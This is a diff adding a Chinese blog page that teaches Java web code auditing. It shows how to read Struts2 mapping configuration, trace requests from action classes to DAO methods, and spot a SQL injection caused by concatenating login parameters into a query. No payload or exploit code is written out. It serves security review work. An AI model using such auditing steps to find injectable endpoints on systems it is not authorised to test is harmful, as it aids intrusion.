@@ -1,0 +1,841 @@
+
+
+<!DOCTYPE html>
+<html lang="" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="代码审计思路、技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020代码审计总结（2022修改版_代码审计快速入门）">
+<meta property="og:url" content="http://novysodope.github.io/2023/01/18/94/index.html">
+<meta property="og:site_name" content="novy&#39;s Blog">
+<meta property="og:description" content="代码审计思路、技巧">
+<meta property="og:locale">
+<meta property="og:image" content="http://novysodope.github.io/images/94/03g8ryiNcXCmWDb2sxCLwPeQMC5875XJ0B6JXTsJ-rs.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/ahoRqZ8OmX8nIqmXjmxdmCNXg9HIYjM3lDlpCNKnq2k.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/MqkiTRDMzFXqnrbMWaVNdyi7xXk16x5PgqbLSZuCQWw.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/pv49Mq5xeCC_YLA8IcSkam-d9u1aGE1gJg3UpeUqxps.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Dytdf6v-onI-WK6MTT40N5OwSOJmwo_02hE_CLMdbcU.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Irhlilxuo-2MKx2odSFmBdKaQYNPTtI842ZBOdQ4oS4.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Irhlilxuo-2MKx2odSFmBdKaQYNPTtI842ZBOdQ4oS4.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Irhlilxuo-2MKx2odSFmBdKaQYNPTtI842ZBOdQ4oS4.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/kK8FAw6EtIZqkqhKB8DbuAM36jgTAi87NX0kmjaFCtM.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/xKobzkA0DPKQJAYr3IWuXx9LBwkKRNOFPSx2pRnp5TM.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/ZWOFKpJHpCrALVWBtA3eGHFQzMw18b32IDPwgNvaGiw.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/7U6Q0RPlUHcYtWwkNA3uOJZRby_2OYnjGQhdwUsnqQ0.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/cLpumxhHC27fzoBXaru3z2cOdf68_QGW3-W5ndyJEis.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/WYa92VOnZTtxfFi-BfTVvypxp-b37fu-gouu2v-5mSs.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/2xbt9PA3nvHCl47ZPYbGTXhdc182yhN6Okhm7MRoDMc.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/qdCNdZFlGwe4FwThj_rK8Qd4Tob6n1IR7kDrqmaE488.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/NqHLOZ6Zw1XfChgS-6OynjX9eXlyAsOom5L6v01T-nA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Pvi1ycOvZrjIO5U_U63enDgH-A42PMIrzZzs02YxavA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/bL_IwGx9NQNDVIb0NjrnPVBzNFvICLZ0qvHyj_VVecs.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/gnZtMNKK7NqOehh64oMw0lR3tcguHdWM1g_P0TGgy3k.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/yq5-MY8A_S1uZEfRY_X-mFs6WRUxE-vTX2VPq-pnrik.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/iNIcOTAcDSaGYfFV5uBZYkrAbIERufzOvEIuf3BVyhM.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/8G4KjJ2_WVlOGBXzQ3XLyDBKL5FgLP68_2DG7EyfDyw.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/oxiQLeU4W3W_skNuz8bqpaAMdHms3phMpQa88MoNT94.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/OksuWgdZQXT-Z6I4VuUoQTyf4BAt31q146Lny71OupY.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/zBpVWsn3KmONqhVeMm8LFGbj44tmiqONTgUGwA3NL-c.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/ExtQQg693lOAQUFT6pUXNVPFyP2_9XC22eQqPxWQdwY.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/J78NS2w5jCwJKJHIFsPZgjAJDHp6fJS5-nNlz2h08Eg.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/-i_kglrMczGdcxhG7r_ps-5dBq996U4cdUygM3Zb-G8.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/ghiiy5z5zpOaGpUn9DwxlHlowa5OFfmOLLapMvLPdGc.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/qxLZEb9G-JLSu7bEdOi3rCINhWiTaNMJTIqSTPjcd1s.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/fbHAaTvjSRZ8RyanLQFC4oAs19kgvs_XRtxu4E2xT0M.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/CLmsZ6R5o1YTaphZMzdP6u7ZOBFhIDImALGvA2yuW7U.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/XaGRVWqDcE6Pi6nzN6oBlDWzp9gKR8BlIeAX21faUFk.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/02T7OkwYMINDtylPswQhAWDCBcPu3bCJDjGaFYfBBqM.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/_TWEVPVzDJTeIzCIVTiptF4-FMBEQpV7B2TZp3AQhL8.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/ULB2W5PiSPHPf3FPK29ErIHb0RDx8lfmJvDaOHWf330.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/4jeraathzV4Zn40QVcNnzepWvBBU2HujHtnIkC-buEg.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/2jIHU6G-7zzKfvSdsr72a1f3UUbIEDJGl0XXdaFHs6Y.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/l_1IhQ2d85v8SQy7kmG7hjB1cbi4c9v_L-Ho_nUCdZU.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/g84RdzSd18uTYbMI_c1ixlyf6m6kdzlCasiQVfH1w98.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/jSTQeFQCoTvGU4TDIKQG6wUVE6vA-nTofU2Vu3K5MM8.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/CUWMpZ1OGtfanaqpHDTH8V9AOzJzxdOf7XhgCQgQCsE.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/YYNMUOwvD9nF9cU1Kr4sCu08wWnqoGDCaZ6iiwt9Y-c.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/sS9QgkQ6LplKU2l3dwmsvqCBWtMBJ4NnEvp3UWK48MU.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/8HVW5PIyG0ds9amUXejUPH6EUiE8q6io4RKfwH_PZcc.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Kx6YeNhVYTyRzkuKG5Vt83Fc85sNj8l8xrXD92YAWYI.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/7vn1l2u0Pea2en2giAKDDLd_74zeGZItxHyRWut7Yo0.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Pc-UmWQtmikf2-1MK-FxMSmIE54K1aH_cEQQF4EfQO4.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Fs-I02d9nWWaBX221zf4RcI1Bh2zQ8WUMa55muoz-4Q.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/vXhvQgyvMQjXVHqJQWgBB2iihvtwJLGeMnMc2EfIz3g.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/ThjAXYuiRJXxdMOvjXxZTYOvH2-R-wM8yH7yyJPg1DQ.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/-XmSt1nw0QxboSsIwIKkS46MnQcM029iz1sQxeUyBpU.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/5rNw4jcWizPMTQyZvbR38AyiGIcKtUDRoEXBxgNJAsU.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/9mxjVafaK73tfOEvuKchCix-lq0o1g5cUhSBv-HOUuA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/b81pYuru6ZvcBJDS7jMj4ahrLABE4bhRCxcud88wFbs.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/PhqfuXx1ua0WphPAI9yzq7KHKeZdIr3rb6b1IWxMFUg.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/mp7GO_j9a5UkEW1sdB1Z9BYmsPcPV2T-tV0NaRj-OAs.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/3F1aWdxrgltQtKgJxzTY7EKvsOLTRG0iTzhPoyPzMFw.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/O33bL1OGiMnKNkJowRYIhPyB5ECi7XdyBzkW4hg6-xw.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Nr6Akt0AgJB-fK9SvrCjFlabokVwmDUWbWh5gRlYFqw.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/1LxYoo8MCUt6AV59I-SLr9hgWw89dxP6ZDctVAFdafA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Z_kT_CvPcwJpGGTRryt5cJ3l3QMusWy9veFPitCLKdA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/TmJrDipkVmGytYrOIchN_uSWeIg2Xen_5XMdbjb0SwA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/q0kMfVfB5MeM8JXBKVpiNhEzFZHb8iFZSgWcOCz2fAg.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/fQm3dQAyOdmenINeWSkrGhE-W-6R9LPriuUJcq1Hv_8.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/zMvusi0Zokp6EK0OmUNXsRoa_g714nxW2EmwDmm2Yw4.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/uhUUAAjoYdiN6xquvOQjt-FJEm2eD0nxl2SygfiGFXk.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/brfEbrhkETTnh4b59Gfjl6DGoKDipVRAG3TzY08wrz8.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/3F_CcX9X8lg_dpZmnMLpA6LGF2I_IjeDTm1gHVc9my0.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/UNDvgX4AsGhQ7yDHZByznh5o-U7i8mD1zWX3madrrDA.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/goUPy5U0VeNIT0ULGMi-9TO7-RivQCvUiH278DCmZPI.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/TN763bwqQM2lvUQI6tW4ft14ca-qUT-JuLeNE62n-RM.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/2d11Bf3buzFLXGaZdF76mhFJ6wOLCWA2ZhgXeObqips.png">
+<meta property="og:image" content="http://novysodope.github.io/images/94/Ce0FTWUP-cKTZGMOQrx2Li5zBru1fRdE3DDlHZyEtow.png">
+<meta property="article:published_time" content="2023-01-18T05:15:21.000Z">
+<meta property="article:modified_time" content="2023-02-22T03:44:54.221Z">
+<meta property="article:author" content="novy">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://novysodope.github.io/images/94/03g8ryiNcXCmWDb2sxCLwPeQMC5875XJ0B6JXTsJ-rs.png">
+  
+  <title>2020代码审计总结（2022修改版_代码审计快速入门） - novy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>novy&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友情链接
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2020代码审计总结（2022修改版_代码审计快速入门）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      novy
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-01-18 13:15" pubdate>
+        January 18, 2023 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      11k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      36 分钟
+    </span>
+  
+
+  
+  
+    
+
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2020代码审计总结（2022修改版_代码审计快速入门）</h1>
+            
+            <div class="markdown-body">
+              <h1 id="1-识别框架"><a href="#1-识别框架" class="headerlink" title="1. 识别框架"></a>1. <strong>识别框架</strong></h1><p>在打开源码时想判断系统框架，可以看其目录结构，例如一个struts2项目中web.xml文件存在<code>Filter-class</code>为:</p>
+<p><code>org.apache.struts2.dispatcher.xxxx</code></p>
+<p><img src="/images/94/03g8ryiNcXCmWDb2sxCLwPeQMC5875XJ0B6JXTsJ-rs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>以及resources目录（或项目根目录下）中存在strtus.xml </p>
+<p><img src="/images/94/ahoRqZ8OmX8nIqmXjmxdmCNXg9HIYjM3lDlpCNKnq2k.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>如果存在pom那pom.xml中存在struts依赖信息</p>
+<p><img src="/images/94/MqkiTRDMzFXqnrbMWaVNdyi7xXk16x5PgqbLSZuCQWw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>而springmvc的特征则是在pom.xml中会存在相关依赖</p>
+<p><img src="/images/94/pv49Mq5xeCC_YLA8IcSkam-d9u1aGE1gJg3UpeUqxps.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>web.xml中存在关于<code>DispatcherServlet</code>的注册配置</p>
+<p><img src="/images/94/Dytdf6v-onI-WK6MTT40N5OwSOJmwo_02hE_CLMdbcU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>其他的诸如jfinal之类的也会有对应的特征</p>
+<p> </p>
+<h1 id="2-审计思路"><a href="#2-审计思路" class="headerlink" title="2. 审计思路"></a>2. <strong>审计思路</strong></h1><h2 id="2-1-S-truts2"><a href="#2-1-S-truts2" class="headerlink" title="2.1. S**truts2**"></a>2.1. <strong>S**</strong>truts2**</h2><h3 id="2-1-1-映射配置"><a href="#2-1-1-映射配置" class="headerlink" title="2.1.1. 映射配置"></a>2.1.1. 映射配置</h3><h4 id="2-1-1-1-struts-xml"><a href="#2-1-1-1-struts-xml" class="headerlink" title="2.1.1.1. struts.xml"></a>2.1.1.1. <strong>struts.xml</strong></h4><p>通过struts.xml文件,查看存在哪些action,以及处理具体请求的java文件路径</p>
+<p>例如:</p>
+<p><img src="/images/94/Irhlilxuo-2MKx2odSFmBdKaQYNPTtI842ZBOdQ4oS4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h5 id="标签"><a href="#标签" class="headerlink" title="**标签**"></a><strong><action>**</strong>标签**</h5><p>如图所示，<action>标签就是处理请求的配置标签，一个标签表示处理一个请求，在该标签中各字段的属性解释为：</p>
+<p><strong>name：</strong>请求的uri，即请求的路径；</p>
+<p><strong>class：</strong>负责处理该请求的类；</p>
+<p><strong>method：</strong>负责处理该请求的类里的具体方法</p>
+<h5 id="lt-res-ult-gt-标签"><a href="#lt-res-ult-gt-标签" class="headerlink" title="&lt;****res****ult&gt;**标签**"></a><strong>&lt;****res****ult&gt;**</strong>标签**</h5><p><code>&lt;result&gt;标签</code>是结果视图，作为返回结果的，即当一个action处理完之后返回字符串的结果码。框架可以根据这个返回的字符串，映射到指定的页面。<code>result元素</code>可以分为两部分：一是结果映射，一部分是返回结果类型。</p>
+<p><strong>结果映射</strong></p>
+<p><code>result</code>有两个属性可以配置：<code>name属性</code>和<code>type属性</code>。其中的<code>name属性</code>主要用来指定资源的逻辑名称，实际名称在标签内部指定。<code>type属性</code>就是result的返回类型，通俗的说，在该标签中，<code>name属性</code>是与处理方法的返回结果对应，<code>type属性</code>表示结果类型，场景如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.req==<span class="hljs-keyword">null</span>)&#123;<br>       <span class="hljs-keyword">return</span> “failer”;<span class="hljs-comment">//name=”failer”</span><br>&#125;<br>        <span class="hljs-keyword">return</span> “success”;<span class="hljs-comment">//name=”success”</span><br>    &#125;<br></code></pre></div></td></tr></table></figure>
+<p>当方法返回failer时就会跳转到前端/failer.jsp，反之就会跳转到/success.jsp</p>
+<p><strong>结果类型</strong></p>
+<p>结果类型中常用的有四种：<code>dispatcher</code>、<code>redirect</code>、<code>redirectAction</code>和<code>chain</code>。其中<code>dispatcher</code>相当于转发，<code>redirect</code>相当于重定向，<code>redirecAction</code>也是重定向，只不过使用该结果类型的时候，一般是重定向到某个action，最后一种主要用于action的链式处理。其他的还有plainText（用于显示页面的原始内容，比如Servlet或者jsp的源代码）、xslt等 </p>
+<p>回到图中配置解释，在该图中</p>
+<p><img src="/images/94/Irhlilxuo-2MKx2odSFmBdKaQYNPTtI842ZBOdQ4oS4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>login即请求/login，由LoginAction类的login方法处理</p>
+<h5 id="请求后缀配置"><a href="#请求后缀配置" class="headerlink" title="请求后缀配置"></a><strong>请求后缀配置</strong></h5><p>要确定请求的后缀，可以查看 struts.xml或properties文件的配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;do&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;action&quot;</span> /&gt;</span> <br></code></pre></div></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">struts.action.extension = do<br>struts.action.extension = action<br></code></pre></div></td></tr></table></figure>
+<p>表示.do或.action后缀访问</p>
+<h5 id="struts2的动态方法调用和通配符映射"><a href="#struts2的动态方法调用和通配符映射" class="headerlink" title="struts2的动态方法调用和通配符映射"></a><strong>struts2的动态方法调用和通配符映射</strong></h5><p>除了以上的映射写法，st2还有一种动态方法调用，但是Struts2默认关闭该功能，需要使用需要手动打开，配置如下</p>
+<p><code>struts.enable.DynamicMethodInvocation = true </code> </p>
+<h6 id="动态方法调用"><a href="#动态方法调用" class="headerlink" title="动态方法调用** **"></a><strong>动态方法调用**</strong> **</h6><p>还是这个图</p>
+<p><img src="/images/94/Irhlilxuo-2MKx2odSFmBdKaQYNPTtI842ZBOdQ4oS4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>当动态方法启用后，以action后缀为例，原来的<code>/login.action</code>会变成<code>/login!login.action</code>（Action配置名!方法名.扩展名），方法调用一样，由LoginAction类的login方法处理</p>
+<h6 id="通配符映射"><a href="#通配符映射" class="headerlink" title="通配符映射"></a><strong>通配符映射</strong></h6><p>由上图的写法变为下面的写法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*_*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.thc.web.action.&#123;1&#125;Action&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;2&#125;&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span>   <br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>failer.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>  <br></code></pre></div></td></tr></table></figure>
+<p>该写法的请求URL表现为：<code>/Login_login</code>，同样是由LoginAction里的login方法处理。<code>&#123;1&#125;</code>、<code>&#123;2&#125;</code>表示通配符的位置，这里<code>&#123;1&#125;</code>表示类名<code>Login</code>，<code>&#123;2&#125;</code>表示方法名<code>login</code>。</p>
+<p> </p>
+<p>在审计漏洞之前，我们需要了解一下web各层流程</p>
+<h3 id="1-1-1-层次介绍"><a href="#1-1-1-层次介绍" class="headerlink" title="1.1.1. 层次介绍"></a>1.1.1. <strong>层次介绍</strong></h3><p>通常在struts2中</p>
+<p><strong>action为业务逻辑处理层</strong>，action层接收来自视图层（前端，用户操作层）的请求，并接收请求参数，同时负责调用模型Model层方法来完成业务逻辑的处理，最后控制程序的流程，选择一个合适的视图，将结果显示给用户，一般这个目录下文件的特征表现为<code>XxxxAction.java</code>，比如<code>NovyAction.java</code>；</p>
+<p> </p>
+<p><strong>dao为数据持久层</strong>，在这层中通常是用来做数据库处理的，增删查改都在这里，一般这个目录下文件的特征表现为<code>xxxxDao.java</code>，比如<code>NovyDao.java</code>。</p>
+<p> </p>
+<p>在web运行处理请求时流程为<strong>视图层**</strong>&lt;****-&gt;业务逻辑处理层&lt;-****&gt;<strong>**数据持久层</strong></p>
+<h3 id="1-1-2-实例"><a href="#1-1-2-实例" class="headerlink" title="1.1.2. 实例"></a>1.1.2. <strong>实例</strong></h3><p>Idea打开项目，查看目录结构</p>
+<p><img src="/images/94/kK8FAw6EtIZqkqhKB8DbuAM36jgTAi87NX0kmjaFCtM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>根据之前3.1.1.介绍，查看映射配置</p>
+<p>查看struts.xml中含有哪些action以便找到处理请求对应的类</p>
+<p><img src="/images/94/xKobzkA0DPKQJAYr3IWuXx9LBwkKRNOFPSx2pRnp5TM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>根据配置我们知道请求/Gologin由GoLogin类处理，所以我们可以根据路径跟进GoLogin类，其路径组成对应为</p>
+<p><code>src/com/action/GoLogin.java</code></p>
+<p>在idea里，一般可以按住ctrl+鼠标左键点击即可跳转到类</p>
+<p><img src="/images/94/ZWOFKpJHpCrALVWBtA3eGHFQzMw18b32IDPwgNvaGiw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h4 id="1-1-2-1-代码分析"><a href="#1-1-2-1-代码分析" class="headerlink" title="1.1.2.1. 代码分析"></a>1.1.2.1. <strong>代码分析</strong></h4><p>在<code>GoLogin</code>类中我们就可以看到一些对登陆的处理，如果我们找SQL注入的话就看处理登陆参数的相关方法，比如此处new了一个<code>AdminDao</code>类下的<code>checkLogin</code>方法来处理<code>username</code>及<code>Password</code>，再根据判断返回的结果是否为空来显示相应内容</p>
+<p><img src="/images/94/7U6Q0RPlUHcYtWwkNA3uOJZRby_2OYnjGQhdwUsnqQ0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>根据<code>3.1.2</code>介绍我们知道<code>AdminDao</code>为数据持久层，那么<code>ChekLogin</code>方法通常就是对登陆做数据库操作的地方，所以我们跟进一下该方法</p>
+<p><img src="/images/94/cLpumxhHC27fzoBXaru3z2cOdf68_QGW3-W5ndyJEis.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在此处因为直接拼接请求参数，然后带入数据库去执行查询导致了SQL注入漏洞的产生</p>
